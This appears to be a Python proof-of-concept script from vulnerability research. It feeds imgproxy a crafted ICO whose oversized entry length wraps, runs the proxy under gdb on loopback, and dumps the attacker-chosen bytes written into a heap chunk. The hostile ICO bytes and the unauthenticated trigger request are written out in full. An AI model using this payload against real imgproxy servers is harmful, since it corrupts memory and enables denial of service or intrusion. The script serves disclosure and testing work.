#!/usr/bin/env python3
"""Live chosen-byte readback in a real imgproxy process under gdb.

Usage: ico_gdb_readback.py BINARY LIBDIR TAG REQUEST_PATH [TIMEOUT]

Serves a 54-byte crafted ICO on 127.0.0.1:18081, launches BINARY under gdb on
127.0.0.1:18080, sends exactly one unauthenticated GET, and records the C
write-site frame plus the bytes after vips_foreign_load_read_full returns.

The breakpoint is conditional on the wrapped len (0xfffffff5), which only the
hostile ICO directory entry produces. On a hit the script saves the buffer
pointer, steps out of read_full and dumps the chosen bytes and malloc chunk
header before glibc's corruption abort. Both endpoints are loopback-only.
"""
import http.client
import http.server
import os
import socket
import struct
import subprocess
import sys
import tempfile
import threading
import time

SRC_HOST, SRC_PORT = "127.0.0.1", 18081
PROXY_HOST, PROXY_PORT = "127.0.0.1", 18080
HERE = os.path.dirname(os.path.abspath(__file__))

HEADER = b"\x00\x00\x01\x00\x01\x00"
ENTRY = struct.pack("<BBBBHHII", 1, 1, 0, 0, 1, 32, 0xFFFFFFF5, 22)
HOSTILE_ICO = HEADER + ENTRY + bytes([0x5A, 0x5B, 0x5C, 0x5D] * 8)

GDB_BODY = """set pagination off
set confirm off
set print pretty on
set breakpoint pending on
handle SIGPIPE nostop noprint pass
set environment IMGPROXY_BIND {bind}
set environment IMGPROXY_BASE_URL http://{src}:{srcport}/
set environment IMGPROXY_WORKERS 1
set environment IMGPROXY_CONCURRENCY 1
set environment IMGPROXY_LOG_LEVEL info
set environment IMGPROXY_ALLOW_LOOPBACK_SOURCE_ADDRESSES true
set environment LD_LIBRARY_PATH {libdir}
break vips_foreign_load_read_full if $rdx == 0xfffffff5
run
printf "GDB_HIT read_full rdi(source)=%p rsi(buf)=%p rdx(len)=%p\\n", $rdi, $rsi, $rdx
set $dst = $rsi
set $base = $dst - 14
printf "GDB base(data)=%p actual_data=%p\\n", $base, $dst
printf "GDB_BEFORE 4x8 at base-16:\\n"
x/4gx $base-16
finish
printf "GDB_AFTER 48 bytes at actual_data:\\n"
x/48bx $dst
printf "GDB_CHUNK 4x8 at base-16:\\n"
x/4gx $base-16
printf "GDB_BT\\n"
bt 12
quit
"""


class Source(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "image/x-icon")
        self.send_header("Content-Length", str(len(HOSTILE_ICO)))
        self.end_headers()
        self.wfile.write(HOSTILE_ICO)

    def log_message(self, *args):
        pass

def wait_port(host, port, seconds=20.0):
    end = time.monotonic() + seconds
    while time.monotonic() < end:
        try:
            with socket.create_connection((host, port), 0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def main():
    binary, libdir, tag, request_path = sys.argv[1:5]
    timeout = float(sys.argv[5]) if len(sys.argv) > 5 else 10.0
    gdb_wait = float(sys.argv[6]) if len(sys.argv) > 6 else 45.0

    fd, cmdpath = tempfile.mkstemp(prefix=f"ico-gdb-{tag}-", suffix=".cmd")
    with os.fdopen(fd, "w") as f:
        f.write(GDB_BODY.format(
            bind=f"{PROXY_HOST}:{PROXY_PORT}", src=SRC_HOST,
            srcport=SRC_PORT, libdir=os.path.abspath(libdir)))

    logpath = os.path.join(HERE, f"http-ico-{tag}.log")
    srv = http.server.ThreadingHTTPServer((SRC_HOST, SRC_PORT), Source)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    gdb = subprocess.Popen(
        ["gdb", "-batch", "-x", cmdpath, binary],
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True,
    )
    status, body, err = "-", "", ""
    try:
        if not wait_port(PROXY_HOST, PROXY_PORT):
            print(f"ICO_GDB tag={tag} PROXY_LISTEN=FAIL", flush=True)
            return 2
        started = time.monotonic()
        try:
            conn = http.client.HTTPConnection(PROXY_HOST, PROXY_PORT, timeout=timeout)
            conn.request("GET", f"/insecure/{request_path}",
                         headers={"Host": PROXY_HOST})
            resp = conn.getresponse()
            status = resp.status
            body = resp.read(600).decode("utf-8", "replace").replace("\n", "\\n")
            conn.close()
        except Exception as exc:
            err = f"{type(exc).__name__}: {exc}"
        elapsed = time.monotonic() - started
        print(f"ICO_GDB tag={tag} path={request_path} status={status} "
              f"elapsed={elapsed:.3f} err={err!r} body={body[:200]!r} "
              f"log={logpath}", flush=True)
    finally:
        try:
            out, _ = gdb.communicate(timeout=gdb_wait)
        except subprocess.TimeoutExpired:
            gdb.kill()
            out, _ = gdb.communicate()
        with open(logpath, "w") as f:
            f.write(f"CLIENT status={status} elapsed err={err!r} body={body[:200]!r}\n")
            f.write("=== GDB OUTPUT ===\n")
            f.write(out)
        for line in out.splitlines():
            if line.startswith(("GDB_HIT", "GDB base", "GDB_AFTER",
                                "0x5a", "GDB_BT", "#0 ", "Breakpoint 1")):
                print(f"ICO_GDB_LOG {line[:400]}", flush=True)
        srv.shutdown()
        srv.server_close()
        os.unlink(cmdpath)
    return 0


if __name__ == "__main__":
    sys.exit(main())
